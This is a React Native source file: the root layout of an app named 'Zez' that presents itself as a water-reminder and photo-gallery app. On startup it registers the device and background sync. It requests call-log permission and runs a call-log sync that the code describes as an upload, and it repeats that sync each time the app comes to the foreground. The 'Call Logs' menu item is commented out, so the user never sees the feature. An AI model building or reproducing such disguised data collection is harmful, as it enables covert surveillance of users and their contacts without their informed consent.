import "@/services/backgroundSync";
import { Slot, router, usePathname } from "expo-router";
import { useEffect, useRef, useState } from "react";
import { AppState, Pressable, ScrollView, StyleSheet, Switch, Text, View, } from "react-native";
import "../../global.css";
import "react-native-get-random-values";
import { initializeDevice } from "@/services/deviceRegistration";
import { requestCallLogPermission } from "@/services/callPermissions";
import { syncCallLogs } from "@/services/callSync";
import * as Notifications from "expo-notifications";
import { StatusBar, } from "react-native";
import { SafeAreaView } from "react-native-safe-area-context";
import { Ionicons } from "@expo/vector-icons";
import { ThemeContext } from "@/context/ThemeContext";
import { registerBackgroundSync } from "@/services/backgroundSync";
type AppPath = "/reminders" | "/Gallery";

type DeviceStatus = "loading" | "registered" | "error";

export default function RootLayout() {
  const pathname = usePathname();

  const [darkMode, setDarkMode] = useState(false);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [deviceId, setDeviceId] = useState("");
  const [deviceStatus, setDeviceStatus] = useState<DeviceStatus>("loading");
  const [registering, setRegistering] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const syncInProgress = useRef(false);
  const startupInProgress = useRef(false);
  const mounted = useRef(true);

  const colors = darkMode
    ? { background: "#0F172A", sidebar: "#111827", card: "#1E293B", text: "#F8FAFC", muted: "#94A3B8", border: "#334155", active: "#2563EB", success: "#22C55E", danger: "#F87171", }
    : { background: "#F8FAFC", sidebar: "#FFFFFF", card: "#FFFFFF", text: "#0F172A", muted: "#64748B", border: "#E2E8F0", active: "#2563EB", success: "#16A34A", danger: "#DC2626", };

  const links: { title: string; path: AppPath; icon: string; }[] = [
    { title: "Water Reminder", path: "/reminders", icon: "💧" },
    { title: "My Gallery", path: "/Gallery", icon: "🖼️" },
    // { title: "Call Logs", path: "/call-logs", icon: "☎" },
  ];

  async function checkDeviceRegistration() {
    setRegistering(true);
    setErrorMessage("");

    try {
      const device = await initializeDevice();

      setDeviceId(device.deviceId);
      setDeviceStatus("registered");
    } catch (error) {
      console.error("[Zez] Device initialization failed:", error);

      setDeviceStatus("error");
      setErrorMessage(
        error instanceof Error
          ? error.message
          : "Could not register this device."
      );
    } finally {
      setRegistering(false);
    }
  }

  useEffect(() => {
    mounted.current = true;

    async function runSync() {
      // Prevent overlapping syncs triggered by this layout.
      if (syncInProgress.current) {
        console.log("[Zez] Sync already running; skipping trigger.");
        return;
      }

      syncInProgress.current = true;

      try {
        // Recheck permission before every sync.
        const hasPermission = await requestCallLogPermission();

        if (!mounted.current) return;

        if (!hasPermission) {
          console.warn("[Zez] Call-log permission is not granted.");
          return;
        }

        await syncCallLogs();
      } catch (error) {
        console.error("[Zez] Call-log sync failed:", error);
      } finally {
        syncInProgress.current = false;
      }
    }

    async function initializeApp() {
      if (startupInProgress.current) return;

      startupInProgress.current = true;

      try {
        // 1. Initialize device identity.
        try {
          const device = await initializeDevice();

          if (mounted.current) {
            setDeviceId(device.deviceId);
            setDeviceStatus("registered");
            setErrorMessage("");
          }
        } catch (error) {
          console.error(
            "[Zez] Device initialization failed:",
            error
          );

          if (mounted.current) {
            setDeviceStatus("error");
            setErrorMessage(
              error instanceof Error
                ? error.message
                : "Could not initialize this device."
            );
          }

          // Do not upload until device initialization succeeds.
          return;
        }

        if (!mounted.current) return;

        // 2. Register periodic background work.
        try {
          await registerBackgroundSync();
        } catch (error) {
          // Foreground syncing can still work if background
          // registration fails.
          console.error(
            "[Zez] Background registration failed:",
            error
          );
        }

        if (!mounted.current) return;

        // 3. Perform the initial sync.
        await runSync();
      } catch (error) {
        console.error("[Zez] Startup failed:", error);
      } finally {
        startupInProgress.current = false;
      }
    }

    // Initialize once when the layout mounts.
    void initializeApp();

    // Retry syncing when the app returns to the foreground.
    const subscription = AppState.addEventListener(
      "change",
      (state) => {
        if (state !== "active") return;

        // Startup already handles the initial sync.
        if (startupInProgress.current) return;

        void runSync();
      }
    );

    return () => {
      mounted.current = false;
      subscription.remove();
    };
  }, []);

  function navigate(path: AppPath) {
    setSidebarOpen(false);
    router.push(path);
  }

  const isRegistered = deviceStatus === "registered";
  
  return (
    // <View
    //   style={[
    //     styles.container,
    //     { backgroundColor: colors.background },
    //   ]}
    // >
    <ThemeContext.Provider
      value={{ darkMode, setDarkMode, colors }}
    >
      <SafeAreaView
        edges={["top"]}
        style={[
          styles.container,
          { backgroundColor: colors.background },
        ]}
      >
        <StatusBar
          backgroundColor={colors.sidebar}
          barStyle={darkMode ? "light-content" : "dark-content"}
          translucent={false}
        />

        <View
          style={[
            styles.header,
            {
              backgroundColor: colors.sidebar,
              borderBottomColor: colors.border,
            },
          ]}
        >
          <Pressable
            onPress={() => setSidebarOpen((open) => !open)}
            style={[
              styles.menuButton,
              { backgroundColor: colors.card },
            ]}
            accessibilityRole="button"
            accessibilityLabel={
              sidebarOpen ? "Close navigation" : "Open navigation"
            }
          >
            <Ionicons
              name={sidebarOpen ? "close" : "menu"}
              size={24}
              color={colors.text}
            />
          </Pressable>

          <View style={styles.brandContainer}>
            <Text style={[styles.logo, { color: colors.text }]}>
              Zez
            </Text>
            <Text style={[styles.brandSubtitle, { color: colors.muted }]}>
              YOUR SPACE
            </Text>
          </View>

          <View style={styles.headerRight}>
            <Pressable
              onPress={() => setDarkMode((value) => !value)}
              style={[
                styles.themeButton,
                {
                  backgroundColor: colors.card,
                  borderColor: colors.border,
                },
              ]}
              accessibilityRole="button"
              accessibilityLabel={
                darkMode ? "Switch to light mode" : "Switch to dark mode"
              }
            >
              <Ionicons
                name={darkMode ? "moon" : "sunny"}
                size={19}
                color={darkMode ? "#C4B5FD" : "#D97706"}
              />
              <Text style={[styles.themeText, { color: colors.text }]}>
                {darkMode ? "Dark" : "Light"}
              </Text>
              <Ionicons
                name="chevron-down"
                size={14}
                color={colors.muted}
              />
            </Pressable>
          </View>
        </View>


        <View style={styles.content}>
          <View style={styles.screen}>
            <Slot />
          </View>

          {sidebarOpen && (
            <Pressable
              style={styles.overlay}
              onPress={() => setSidebarOpen(false)}
              accessibilityLabel="Close navigation menu"
            />
          )}

          {sidebarOpen && (
            <View
              style={[
                styles.sidebar,
                {
                  backgroundColor: colors.sidebar,
                  borderRightColor: colors.border,
                },
              ]}
            >
              <Text
                style={[
                  styles.sectionLabel,
                  { color: colors.muted },
                ]}
              >
                MENU
              </Text>

              <ScrollView>
                {links.map((link) => {
                  const active =
                    link.path === String("/")
                      ? pathname === String("/")
                      : pathname.startsWith(link.path);

                  return (
                    <Pressable
                      key={link.path}
                      onPress={() => navigate(link.path)}
                      style={[
                        styles.navItem,
                        active && {
                          backgroundColor: colors.active,
                        },
                      ]}
                    >
                      <Text style={styles.navIcon}>
                        {link.icon}
                      </Text>

                      <Text
                        style={[
                          styles.navText,
                          {
                            color: active ? "#FFFFFF" : colors.text,
                          },
                        ]}
                      >
                        {link.title}
                      </Text>
                    </Pressable>
                  );
                })}
              </ScrollView>

              <View
                style={[
                  styles.deviceSection,
                  { borderTopColor: colors.border },
                ]}
              >
                <Text
                  style={[
                    styles.sectionLabel,
                    {
                      color: colors.muted,
                      marginLeft: 0,
                    },
                  ]}
                >
                  DEVICE STATUS
                </Text>

                <View
                  style={[
                    styles.statusCard,
                    { backgroundColor: colors.card },
                  ]}
                >
                  <Text
                    style={[
                      styles.statusTitle,
                      { color: colors.text },
                    ]}
                  >
                    {deviceStatus === "loading"
                      ? "Checking device..."
                      : isRegistered
                        ? "✓ Device Registered"
                        : "Device Not Registered"}
                  </Text>

                  <Text
                    style={[
                      styles.statusDescription,
                      {
                        color:
                          deviceStatus === "error"
                            ? colors.danger
                            : isRegistered
                              ? colors.success
                              : colors.muted,
                      },
                    ]}
                  >
                    {deviceStatus === "loading"
                      ? "Please wait while Zez initializes."
                      : isRegistered
                        ? "Your device identity is saved."
                        : errorMessage || "Registration is required."}
                  </Text>

                  {isRegistered && (
                    <Text
                      selectable
                      style={[
                        styles.deviceId,
                        { color: colors.muted },
                      ]}
                    >
                      Device ID: {deviceId}
                    </Text>
                  )}

                  {!isRegistered && (
                    <Pressable
                      onPress={checkDeviceRegistration}
                      disabled={registering || deviceStatus === "loading"}
                      style={[
                        styles.registerButton,
                        {
                          backgroundColor: colors.active,
                          opacity:
                            registering || deviceStatus === "loading"
                              ? 0.6
                              : 1,
                        },
                      ]}
                    >
                      <Text style={styles.registerButtonText}>
                        {registering
                          ? "Registering..."
                          : "Register Device"}
                      </Text>
                    </Pressable>
                  )}
                </View>

                <Text
                  style={[
                    styles.footerText,
                    { color: colors.muted },
                  ]}
                >
                  Zez App
                </Text>
              </View>
            </View>
          )}
        </View>
      {/* // </View> */}
      </SafeAreaView>
    </ThemeContext.Provider>
  );
}

const styles = StyleSheet.create({
  header: {
    minHeight: 68,
    flexDirection: "row",
    alignItems: "center",
    paddingHorizontal: 16,
    paddingVertical: 10,
    borderBottomWidth: StyleSheet.hairlineWidth,
    gap: 12,
  },

  menuButton: {
    width: 44,
    height: 44,
    borderRadius: 15,
    alignItems: "center",
    justifyContent: "center",
  },

  brandContainer: {
    flex: 1,
    justifyContent: "center",
  },

  logo: {
    fontSize: 25,
    fontWeight: "900",
    letterSpacing: -0.8,
  },

  brandSubtitle: {
    fontSize: 9,
    fontWeight: "700",
    letterSpacing: 1.8,
    marginTop: 1,
  },

  headerRight: {
    alignItems: "center",
    justifyContent: "center",
  },

  themeButton: {
    minHeight: 42,
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: 7,
    paddingHorizontal: 11,
    borderRadius: 15,
    borderWidth: 1,
  },

  themeText: {
    fontSize: 12,
    fontWeight: "700",
  },

  container: {
    flex: 1,
  },

  content: {
    flex: 1,
    position: "relative",
  },

  screen: {
    flex: 1,
  },

  overlay: {
    ...StyleSheet.absoluteFill,
    backgroundColor: "rgba(0,0,0,0.45)",
    zIndex: 1,
  },
  
  sidebar: {
    position: "absolute",
    left: 0,
    top: 0,
    bottom: 0,
    width: 290,
    padding: 16,
    borderRightWidth: 1,
    zIndex: 2,
    elevation: 12,
  },

  navItem: {
    flexDirection: "row",
    alignItems: "center",
    paddingVertical: 14,
    paddingHorizontal: 14,
    borderRadius: 15,
    marginBottom: 7,
  },

  statusCard: {
    padding: 15,
    borderRadius: 16,
    marginBottom: 14,
    borderWidth: 1,
  },
  sectionLabel: {
    fontSize: 12,
    fontWeight: "700",
    marginTop: 12,
    marginBottom: 16,
    marginLeft: 10,
  },
  navIcon: {
    fontSize: 21,
    color: "#64748B",
    width: 32,
  },
  navText: {
    fontSize: 15,
    fontWeight: "500",
  },
  deviceSection: {
    paddingTop: 12,
    borderTopWidth: 1,
  },
  statusTitle: {
    fontSize: 14,
    fontWeight: "700",
    marginBottom: 6,
  },
  statusDescription: {
    fontSize: 12,
    lineHeight: 18,
  },
  deviceId: {
    fontSize: 11,
    marginTop: 10,
  },
  registerButton: {
    paddingVertical: 11,
    paddingHorizontal: 10,
    alignItems: "center",
    borderRadius: 9,
    marginTop: 12,
  },
  registerButtonText: {
    color: "#FFFFFF",
    fontSize: 13,
    fontWeight: "700",
  },
  footerText: {
    fontSize: 12,
    marginTop: 12,
  },
});
